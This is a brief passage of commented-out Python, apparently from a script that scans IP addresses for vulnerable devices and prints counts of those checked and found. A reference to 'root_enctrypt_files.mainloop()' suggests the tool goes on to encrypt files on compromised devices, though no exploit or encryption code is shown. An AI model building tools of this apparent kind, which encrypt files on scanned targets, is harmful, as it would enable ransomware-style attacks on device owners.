#  root_enctrypt_files.mainloop()
# else:
#  taro = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
#  print(devices_checked, Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
#  print(vulnerable_found, taro, '\n')
#  print('Vulnerable devices not found! Please try again later.')
#  input()
